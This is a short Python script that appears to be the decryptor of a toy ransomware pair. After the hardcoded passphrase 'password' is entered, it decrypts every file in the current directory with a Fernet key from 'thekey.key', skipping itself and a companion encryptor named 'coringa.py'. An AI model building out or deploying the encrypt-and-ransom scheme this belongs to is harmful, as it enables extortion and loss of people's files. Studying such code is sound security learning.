#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
secret_phrase = "password"

for file in os.listdir():
    if file == "coringa.py" or file == "thekey.key" or file == "descoringa.py":
        continue

    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secret_key = key.read()

secret_input = input("Enter the secret phrase to decrypt your files\n")

if secret_input == secret_phrase:
    for file in files:
        # rb stands for "read binary" mode
        with open(file, "rb") as thefile:
            contents = thefile.read()

        contents_decrypted = Fernet(secret_key).decrypt(contents)

        # wb stands for "write binary" mode
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)    
    print("Your files has been decrypted! :D")
else:
    print("Wrong password!! D:")